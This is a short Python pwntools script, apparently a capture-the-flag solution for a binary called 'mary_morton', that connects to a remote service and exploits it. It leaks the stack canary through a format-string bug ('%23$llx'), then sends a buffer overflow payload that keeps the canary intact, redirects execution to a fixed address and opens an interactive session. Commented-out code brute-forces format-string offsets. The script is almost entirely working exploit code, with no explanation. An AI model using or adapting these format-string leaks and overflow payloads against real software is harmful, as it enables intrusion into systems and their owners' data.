from pwn import *

#context.log_level = "debug"
HOST = "146.185.132.36"
PORT = 19153
conn = remote(HOST, PORT)
#conn = process("./mary_morton")

#for i in range(10,1000):
#    conn = process("./mary_morton")
#    print(i)
#    conn.sendlineafter("3. Exit the battle \n", "2")
#    conn.sendline("A" * 8 + "%%%d$llx" % i)
#    conn.recvuntil("A" * 8)
#    print(conn.recvuntil("\n")[:-1])
#    conn.close()

#23 CANARY
conn.sendlineafter("3. Exit the battle \n", "2")
conn.sendline("A" * 8 + "%23$llx")
conn.recvuntil("A" * 8)
CANARY = int(conn.recvuntil("\n")[:-1], 16)
log.success("CANARY :0x%x" % CANARY)
#0040| 0x601028 --> 0x4006a6 (<system@plt+6>:    push   0x2)
#0064| 0x601040 --> 0x4006d6 (<read@plt+6>:  push   0x5)
payload = "A" * 0x88
payload += p64(CANARY)
payload += "A" * 0x8
payload += p64(0x004008da)
conn.sendlineafter("3. Exit the battle \n", "1")
conn.sendline(payload)
conn.interactive()
